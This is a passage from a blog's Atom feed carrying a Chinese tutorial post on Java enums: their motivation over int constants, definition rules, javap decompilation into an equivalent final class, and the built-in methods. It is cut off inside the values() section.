<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Baicai`Blog</title>
  
  <subtitle>你会发光吗？</subtitle>
  <link href="https://baicai.icu/atom.xml" rel="self"/>
  
  <link href="https://baicai.icu/"/>
  <updated>2022-12-06T18:49:20.000Z</updated>
  <id>https://baicai.icu/</id>
  
  <author>
    <name>Ethan</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>聊聊枚举怎么用</title>
    <link href="https://baicai.icu/posts/b0b06c03.html"/>
    <id>https://baicai.icu/posts/b0b06c03.html</id>
    <published>2022-04-27T18:39:56.000Z</published>
    <updated>2022-12-06T18:49:20.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="⭐什么是枚举"><a href="#⭐什么是枚举" class="headerlink" title="⭐什么是枚举"></a>⭐什么是枚举</h3><ul><li>中文的释义，指的是可以一个一个列举</li><li><p>即在一个特定的范围内，有穷的集合，如一年有12个月，一周有7天</p></li><li><p>正因为这种有穷的集合，通常在代码设计中，使用枚举类来定义词典，如是否删除的表示，y表示是，n表示否，也可以说，键值对的映射关系，类似与map集合，redis这种。</p></li></ul><p><br/></p><h3 id="⭐Java中的枚举诞生"><a href="#⭐Java中的枚举诞生" class="headerlink" title="⭐Java中的枚举诞生"></a>⭐Java中的枚举诞生</h3><p> 🥝为何需要枚举类型</p><ul><li>枚举类型是 Java 5 中增加的一个小特性，在此之前，实现枚举的方式为定义编译期常量形式。代码中使用编译期常量的方式在理解性和安全性方面存在不足，单纯的常量数值不能够直观的体现出其作为枚举实例的目的，且实际中无限的取值空间也不能很好的与理论上有限的枚举空间相匹配。</li></ul><p><br/></p><p> 🥝静态常量实现字典</p><ul><li><p>假定使用int类型定义一年中的四季    </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Season</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SPRING</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SUMMER</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">AUTUMN</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">WINTER</span> <span class="operator">=</span> <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">testSeason</span><span class="params">(<span class="type">int</span> season)</span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (season)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span> :</span><br><span class="line"><span class="comment">// 春天...</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span> :</span><br><span class="line"><span class="comment">// 夏天...</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span> :</span><br><span class="line"><span class="comment">// 秋天...</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span> :</span><br><span class="line"><span class="comment">// 冬天...</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(Season.SPRING);</span><br><span class="line">System.out.println(Season.SUMMER);</span><br><span class="line"></span><br><span class="line">testSeason(<span class="number">1</span>);</span><br><span class="line">testSeason(Season.SPRING)</span><br><span class="line">testSeason(-<span class="number">1</span>);</span><br></pre></td></tr></table></figure></li><li><p><strong><font color="#ef7050">「可以看到没有办法通知或者限制调用者需要传递的参数，只要是int值都是合法数据，这个算不上一个好的设计」</font></strong></p></li></ul><p><br/></p><p> 🥝改进静态常量实现字典</p><ul><li><p>改进上述例子，就可以让一个普通类达到枚举一样效果（这也是枚举<a href="#mime">反编译</a>后的效果，下文有详述）</p><ul><li><p>将上述的int类型常量修改为Season类型，并将类声明为final防止被继承。构造函数声明为private，防止外部实例化。    </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Season</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Season</span> <span class="variable">SPRING</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Season</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Season</span> <span class="variable">SUMMER</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Season</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Season</span> <span class="variable">AUTUMN</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Season</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Season</span> <span class="variable">WINTER</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Season</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Season</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">testSeason</span><span class="params">(Season season)</span>&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">testSeason(Season.SPRING);</span><br><span class="line">testSeason(Season.SUMMER);</span><br><span class="line"></span><br><span class="line">testSeason(<span class="number">1</span>);<span class="comment">// 编译报错</span></span><br><span class="line">testSeason(<span class="string">&quot;SPRING&quot;</span>);<span class="comment">// 编译报错</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong><font color="#ef7050">「可以看到没有通知调用者情况下，调用者只能传递已经定义好的Season类型，最多传递一个null，否则将无法通过编译，这也间接限制了调用者传递的数据类型」</font></strong></p></li></ul><p><br/></p><p> 🥝枚举实现字典</p><ul><li><p>例如：一个季节枚举即可表示一年中的四季    </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">SeasonEnum</span> &#123;</span><br><span class="line">    SPRING,</span><br><span class="line">    SUMMER,</span><br><span class="line">    AUTUMN,</span><br><span class="line">    WINTER;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">testSeason2</span><span class="params">(SeasonEnum season)</span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (season)&#123;</span><br><span class="line"><span class="keyword">case</span> SPRING :</span><br><span class="line"><span class="comment">// 春天...</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> SUMMER :</span><br><span class="line"><span class="comment">// 夏天...</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> AUTUMN :</span><br><span class="line"><span class="comment">// 秋天...</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WINTER :</span><br><span class="line"><span class="comment">// 冬天...</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">testSeason(SeasonEnum.SPRING);</span><br><span class="line">testSeason(SeasonEnum.SUMMER);</span><br><span class="line"></span><br><span class="line">testSeason(<span class="number">1</span>);<span class="comment">// 编译报错</span></span><br><span class="line">testSeason(<span class="string">&quot;SPRING&quot;</span>);<span class="comment">// 编译报错</span></span><br></pre></td></tr></table></figure></li><li><p><strong><font color="#ef7050">「可以看到，枚举类型的实例摆脱了数值的限制，能够以实例自身表达其作用和目的」</font></strong></p></li></ul><p><br/></p><h3 id="⭐定义枚举"><a href="#⭐定义枚举" class="headerlink" title="⭐定义枚举"></a>⭐定义枚举</h3><p> 🥝规则</p><ol><li>使用关键字<code>Enum</code>定义枚举</li><li>枚举值需要定义在枚举的构造方法，成员变量之前，枚举值以<code>;</code>分号结束<ul><li>这里的枚举值，和Java语法要求必须先定义enum实例是同一个意思，<strong>实际上通过反编译来看就是一个 static final 构造方法</strong></li></ul></li><li>枚举的构造方法<ul><li>可以使用<code>lombok</code>的无参构造方法<code>@NoArgsConstructor</code>和全参构造构造方法<code>@AllArgsConstructor</code></li><li>但是不能使用<code>lombok</code>的<code>@Data</code>，原因可能在编译的时候，枚举值编译成<code>static final</code>，无法再使用<code>@Data</code>的setter方法</li></ul></li><li>命名（阿里巴巴Java开发手册1.4.0）<ul><li><img src="https://pic.baicai.icu/枚举.assets/阿里巴巴开发手册-枚举.png" alt="阿里巴巴开发手册-枚举"></li><li><img src="https://pic.baicai.icu/枚举.assets/阿里巴巴开发手册-枚举2.png" alt="阿里巴巴开发手册-枚举2"></li></ul></li></ol><ul><li>需要注意的只有以上4点，其余部分和普通类一样，可以在枚举中定义普通的方法，接口，重写方法等等</li></ul><p><br/></p><p> 🥝示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 最简单的枚举</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">SeasonEnum</span> &#123;</span><br><span class="line">    SPRING,</span><br><span class="line">    SUMMER,</span><br><span class="line">    AUTUMN,</span><br><span class="line">    WINTER;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Sports</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">swim</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 带参的枚举，实现接口并重写toString方法</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">SeasonEnum</span> <span class="keyword">implements</span> <span class="title class_">Sports</span>&#123;</span><br><span class="line">    SPRING(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;春天&quot;</span>),</span><br><span class="line">    SUMMER(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;夏天&quot;</span>),</span><br><span class="line">    AUTUMN(<span class="string">&quot;3&quot;</span>,<span class="string">&quot;秋天&quot;</span>),</span><br><span class="line">    WINTER(<span class="string">&quot;4&quot;</span>,<span class="string">&quot;冬天&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line">    <span class="keyword">private</span> String index;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line">    <span class="keyword">private</span> String description;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;SeasonEnum&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;description=&#x27;&quot;</span> + description + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, index=&#x27;&quot;</span> + index + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printSeason</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;该枚举值的中文描述为：&quot;</span> +<span class="built_in">this</span>.description);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">swim</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;夏天最好运动的方式是游泳...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br/></p><h3 id="⭐反编译"><a href="#⭐反编译" class="headerlink" title="⭐反编译"></a>⭐反编译</h3><p> 🥝<span id="mime">命令反编译</span></p><ul><li>使用<code>javap -c SeasonEnum.class</code>命令反编译上述<code>SeasonEnum</code>枚举的字节码文件<ul><li><img src="https://pic.baicai.icu/枚举.assets/反编译1.png" alt="反编译1"></li><li><img src="https://pic.baicai.icu/枚举.assets/反编译2.png" alt="反编译2"></li><li><img src="https://pic.baicai.icu/枚举.assets/反编译3.png" alt="反编译3"></li></ul></li></ul><p><br/></p><p> 🥝还原成普通类</p><ul><li><p>根据字节码的图片和其他博文，尽量还原<code>SeasonEnum</code>枚举的普通类形式</p><ul><li><p>在第一张图片的黄色框中可以看到，<code>SeasonEnum</code>是继承了<code>Enum</code>的，而在编码时期是无法手动继承，只能使用关键字实现这一继承</p></li><li><p><strong><font color="#ef7050">「从第三张图片的static方法观察到，SeasonEnum内部声明的多个实例，其构造过程是编译器在静态代码库中，调用 SeasonEnum 自身和父类的构造函数完成定义的」</font></strong></p></li><li><p>还原的过程省略了如<code>toString</code>等方法，可得如下普通类    </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">SeasonEnum</span> <span class="keyword">extends</span> <span class="title class_">java</span>.lang.Enum &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 枚举值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> SeasonEnum SPRING;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> SeasonEnum SUMMER;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> SeasonEnum AUTUMN;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> SeasonEnum WINTER;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 枚举值数组</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> SeasonEnum[] $VALUES;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义的成员变量</span></span><br><span class="line">    <span class="keyword">private</span> String index;</span><br><span class="line">    <span class="keyword">private</span> String description;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取枚举数组</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SeasonEnum[] values() &#123;</span><br><span class="line">        <span class="keyword">return</span> $VALUES.clone();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据枚举值的变量名获取枚举值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SeasonEnum <span class="title function_">valueOf</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Enum.valueOf(SeasonEnum.class, name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 带参构造方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">SeasonEnum</span><span class="params">(String name, <span class="type">int</span> ordinal, String index, String description)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">super</span>(name, ordinal);</span><br><span class="line">        <span class="built_in">this</span>.index = index;</span><br><span class="line">        <span class="built_in">this</span>.description = description;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化</span></span><br><span class="line">    <span class="keyword">static</span></span><br><span class="line">    &#123;</span><br><span class="line">        SPRING = <span class="keyword">new</span> <span class="title class_">SeasonEnum</span>(<span class="string">&quot;SPRING&quot;</span>, <span class="number">0</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;春天&quot;</span>);</span><br><span class="line">        SUMMER = <span class="keyword">new</span> <span class="title class_">SeasonEnum</span>(<span class="string">&quot;SUMMER&quot;</span>, <span class="number">1</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;夏天&quot;</span>);</span><br><span class="line">        AUTUMN = <span class="keyword">new</span> <span class="title class_">SeasonEnum</span>(<span class="string">&quot;AUTUMN&quot;</span>, <span class="number">2</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;秋天&quot;</span>);</span><br><span class="line">        WINTER = <span class="keyword">new</span> <span class="title class_">SeasonEnum</span>(<span class="string">&quot;WINTER&quot;</span>, <span class="number">3</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;冬天&quot;</span>);</span><br><span class="line">        $VALUES = (<span class="keyword">new</span> <span class="title class_">SeasonEnum</span>[] &#123;</span><br><span class="line">                SPRING, SUMMER, AUTUMN, WINTER</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><p><br/></p><p> 🥝源码分析</p><ul><li><p>观察 <code>java.lang</code>包下的<code>Enum</code>源代码其中定义的两个属性，及同名函数    </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Enum</span>&lt;E <span class="keyword">extends</span> <span class="title class_">Enum</span>&lt;E&gt;&gt; <span class="keyword">implements</span> <span class="title class_">Comparable</span>&lt;E&gt;, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">name</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> ordinal;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">ordinal</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ordinal;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">Enum</span><span class="params">(String name, <span class="type">int</span> ordinal)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.ordinal = ordinal;</span><br><span class="line">    &#125;</span><br><span class="line">    ...  <span class="comment">// omit some content</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>从源码中可知 Enum的构造函数为 <strong>protected</strong> 级别，再从<a href="#mime">反编译</a>的照片观察到 SeasonEnum内部声明的四个实例，发现并未显式调用Enum父类的构造函数，甚至连SeasonEnum自身的构造函数也没有显式调用。由此可知，枚举类内部定义的多个实例，其构造过程是由编译器调用构造函数来处理完成的。从Enum构造函数的注释，也可以佐证这一点</p><p><img src="https://pic.baicai.icu/枚举.assets/enum构造方法的注释说明.png" alt="enum构造方法的注释说明"></p></blockquote></li></ul><p><br/></p><h3 id="⭐枚举中的方法"><a href="#⭐枚举中的方法" class="headerlink" title="⭐枚举中的方法"></a>⭐枚举中的方法</h3><p> 🥝方法汇总</p><ul><li><p>java.lang.Enum中的方法</p><ul><li><img src="https://pic.baicai.icu/枚举.assets/Enum中的方法.png" alt="Enum中的方法"></li></ul></li><li><p>SeasonEnum中的方法</p></li></ul><div class="table-container"><table><thead><tr><th>返回值</th><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>SeasonEnum[]</td><td>values()</td><td>返回一个此枚举所有实例的数组</td></tr></tbody></table></div><p><br/></p><p> 🥝name()和toString()</p><ul><li>name()<ul><li>根据枚举值来获取该枚举成员的变量名。</li></ul></li><li>toString()<ul><li>返回枚举值的变量名。</li></ul></li><li>相同点<ul><li>作用相同，均可获取枚举成员的变量名</li></ul></li><li>不同点<ul><li>调用时的参数不同</li><li>name方法是用final修饰的不能被重写，而toString是可以被重写的</li></ul></li></ul><p><br/></p><p> 🥝ordinal()</p><ul><li><p>该方法作用是，返回定义的枚举值的顺序，从0开始计数。</p></li><li><p>ordinal()方法是被设计用于基于枚举的复杂数据结构，例如EnumSet和EnumMap 。 </p></li><li><p>如果修改了枚举值定义的顺序，就会导致枚举值<code>ordinal()</code>的返回值发生变化</p><ul><li><p>所以一般枚举的做法就是在枚举内增加成员变量，再通过枚举值来自定义顺序，如本文使用的<code>SeasonEnum</code>枚举    </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SPRING(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;春天&quot;</span>),</span><br><span class="line">SUMMER(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;夏天&quot;</span>),</span><br><span class="line">AUTUMN(<span class="string">&quot;3&quot;</span>,<span class="string">&quot;秋天&quot;</span>),</span><br><span class="line">WINTER(<span class="string">&quot;4&quot;</span>,<span class="string">&quot;冬天&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义顺序</span></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="keyword">private</span> String index;</span><br></pre></td></tr></table></figure></li></ul></li></ul><p><br/></p><p> 🥝valueOf()    </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 上述反编译后的SeasonEnum枚举的valueOf()方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> SeasonEnum <span class="title function_">valueOf</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Enum.valueOf(SeasonEnum.class, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Enum源码中的valueOf()方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Enum</span>&lt;T&gt;&gt; T <span class="title function_">valueOf</span><span class="params">(Class&lt;T&gt; enumType, String name)</span> &#123;</span><br><span class="line">    <span class="type">T</span> <span class="variable">result</span> <span class="operator">=</span> enumType.enumConstantDirectory().get(name);</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>(<span class="string">&quot;Name is null&quot;</span>);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(</span><br><span class="line">        <span class="string">&quot;No enum constant &quot;</span> + enumType.getCanonicalName() + <span class="string">&quot;.&quot;</span> + name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><strong><font color="#ef7050">「比较反编译生成的 valueOf 函数和Enum 源码中的 valueOf 函数，可以发现，编译器生成的 valueOf 函数内部调用的其实就是父类 Enum中定义的 valueOf 函数。」</font></strong></p></li><li><p>而父类 Enum中定义的 valueOf 函数，其实调用的是 Class 类中定义的 enumConstantDirectory 函数，在该函数内对参数 enumType 是否为枚举类型进行判断</p><ul><li>当传入null时，抛出<code>NullPointerException</code>异常<ul><li><img src="https://pic.baicai.icu/枚举.assets/NullPointerException异常.png" alt="NullPointerException异常"></li></ul></li><li>当传入不存在的枚举值时，抛出<span id="IllegalArgumentException">IllegalArgumentException</span>异常<ul><li><img src="https://pic.baicai.icu/枚举.assets/IllegalArgumentException异常.png" alt="IllegalArgumentException异常"></li></ul></li><li>当传入存在的枚举值时，返回枚举实例名称和枚举实例构成的 map 对象<ul><li><img src="https://pic.baicai.icu/枚举.assets/valueof传入正常枚举值.png" alt="valueof传入正常枚举值"></li></ul></li></ul></li></ul><p><br/></p><p> 🥝values()</p><ul><li><p>该方法在<code>java.lang.Enum</code>中不存在</p></li><li><p>观察反编译生成的 values 函数，返回的是枚举类内部声明的实例数组的 clone 对象，即返回一个所有枚举值的数组    </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span 